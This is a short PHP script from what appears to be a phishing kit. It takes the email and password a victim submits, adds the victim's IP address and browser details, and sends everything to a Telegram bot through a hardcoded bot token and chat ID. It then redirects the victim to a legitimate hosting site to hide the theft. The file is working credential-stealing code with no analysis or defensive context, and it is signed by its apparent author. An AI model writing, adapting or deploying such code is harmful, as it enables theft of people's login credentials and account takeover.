<?php


$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ LOGIN ]-----++--\n";
$message .= "Email : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "---------[ IP Infos ]-----------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------[CryHeLL Was Here 2021]----------------------\n";



$token = "2070137648:AAFeTcXAwJxz_frpuW8DUonVzJTur5Teods";
$data = [
    'text' => $message,
    'chat_id' => '-624114360'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header('Location: https://ionos.com');
exit();
